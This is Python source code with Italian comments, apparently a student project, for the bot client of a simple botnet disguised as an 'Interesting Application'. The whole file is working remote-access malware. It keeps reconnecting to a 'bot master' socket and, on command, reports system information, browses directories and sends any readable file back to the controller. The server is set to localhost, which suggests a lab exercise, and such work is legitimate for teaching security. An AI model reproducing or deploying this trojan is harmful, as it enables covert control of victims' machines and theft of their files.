"""
Bot Applicazione Interessante

AUTORI: Matteo Marino, Alessandro Trincone, Vincenzo Papale
"""

from socket import *    #funzioni per le socket
import time             #funzione sleep
from functions import * #funzioni recupero e formattazione dei dati

serverName = "localhost"            #IP del bot master
serverPort = 12000                  #porta su cui comunica il bot master
server = (serverName,serverPort)
clientSocket = socket(AF_INET, SOCK_STREAM)     #creazione del socket
error = True
while error == True:    #Tenta la connessione al bot master
    error = False
    try:
        clientSocket.connect(server)
    #In caso trova il bot master occupato, attende 5s e ritenta
    except ConnectionRefusedError:  
        time.sleep(5)
        error = True
    except TimeoutError:
        time.sleep(5)
        error = True

while True:
    try:
        messaggio = " "
        comando = clientSocket.recv(1024).decode()
        #Visualizza info sul SO e sulla macchina
        if comando == "1":
            messaggio = SystemInfo()
        #Visualizza i file presenti nella directory corrente
        elif comando == "2":
            ls = os.listdir()
            if len (ls) != 0:
                messaggio = ""
            for x in ls:
                messaggio = messaggio + x + "\n"
        #Cambia directory secondo quanto specificato in path
        elif comando[0] == "3":
            path = comando[2:]
            try:
                if path == "":
                    os.chdir(".")
                    messaggio = "directory cambiata:\n" + os.getcwd()
                else:
                    try:
                        os.chdir (path)
                        messaggio = "directory cambiata:\n" + os.getcwd()
                    except NotADirectoryError:
                        messaggio = "Not a Directory\n"
            except FileNotFoundError:
                messaggio = "Directory non trovata"
        #Visualizza il percorso della working directory
        elif comando == "4":
            messaggio = os.getcwd()
        #Esegue il download di un file della cwd
        elif comando[0] == "5":
            readFile = comando[1:]
            try:
                file = open(readFile,"rb")
                messaggio = file.read()
            except FileNotFoundError:
                messaggio = "File non trovato\n"
            except PermissionError:
                messaggio = "Permesso negato\n"
            except Exception:
                messaggio = "Errore nell'apertura del file\n"
        #Termina
        elif comando == "exit":
            break
        if comando[0] == "5":
            try:
                if(messaggio == "File non trovato\n" or messaggio == "Permesso negato\n" or messaggio == "Errore nell'apertura del file\n"):
                    raise Exception
                else:
                    clientSocket.send("Ok\n".encode())
                msglen = len(messaggio)
                clientSocket.send(str(msglen).encode())
                totsent = 0
                while totsent < msglen:
                    try:
                        sent = clientSocket.send(messaggio[totsent:])
                        if sent == 0:
                            raise RuntimeError
                        totsent += sent
                    except RuntimeError:
                        clientSocket.send("Errore nell'invio del file".encode())
            except Exception:
                clientSocket.send(messaggio.encode())
        else:
            clientSocket.send(messaggio.encode())
    except ConnectionAbortedError:          #Ritenta la connessione in caso di interruzione da parte dell'host
        f = open("ApplicazioneInteressanteCrash.txt","a")     #Crea un crashreport indicando l'errore avvenuto
        f.write(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " Applicazione Interessante : Connessione Interrotta dall'host\n")
        f.close()
        while error == True:
            error = False
            try:
                clientSocket.connect(server)
            except ConnectionRefusedError:
                time.sleep(5)
                error = True
    except ConnectionResetError:           #Ritenta la connessione in caso di un'interruzione forzata da parte dell'host remoto
        f = open("ApplicazioneInteressanteCrash.txt","a")    #Crea un crashreport indicando l'errore avvenuto
        f.write(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " Applicazione Interessante : Connessione Interrotta forzatamente dall'host remoto\n")
        f.close()
        error = True
        while error == True:
            error = False
            try:
                clientSocket.connect(server)
            except ConnectionRefusedError:
                time.sleep(5)
                error = True
    except ConnectionError:                #Ritenta la connessione in caso di un errore generico di connessione
        f = open("ApplicazioneInteressanteCrash.txt","a")    #Crea un crashreport indicando l'errore avvenuto
        f.write(datetime.now().strftime("%d-%m-%Y %H:%M:%S") + " Applicazione Interessante : Errore di connessione\n")
        f.close()
        error = True
        while error == True:
            error = False
            try:
                clientSocket.connect(server)
            except ConnectionRefusedError:
                time.sleep(5)
                error = True
clientSocket.close()